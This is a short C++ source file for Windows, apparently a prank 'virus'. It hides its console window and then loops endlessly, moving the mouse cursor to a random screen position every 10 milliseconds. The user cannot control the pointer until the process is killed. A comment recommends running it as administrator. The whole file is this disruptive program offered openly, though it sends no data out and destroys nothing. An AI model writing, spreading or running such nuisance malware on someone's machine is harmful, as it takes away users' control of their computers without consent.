#include<Windows.h>//Includes Windows library
int scrwid,scrht,a,b;
void getscrdim()//Gets screen dimensions of device
{
  scrwid=GetSystemMetrics(SM_CXSCREEN);//Gets width of screen
  scrht=GetSystemMetrics(SM_CYSCREEN);//Gets height of screen
}
void randommousepos()//Puts mouse at random position
{
  a=rand()%scrwid;//Random position(width coordinate) within screen width
  b=rand()%scrht;//Random position(height coordinate) within screen height
  SetCursorPos(a,b);//Sets cursor at random position coordinates
}
int main()
{
  FreeConsole();//Does not show terminal screen
  getscrdim();
  while(true)
  {
    randommousepos();//Calls function to set mouse pointer at random positions
    Sleep(10);//Virus is activated for 10 ms
  }
}//Program can be run after allowing "Run as administrator"

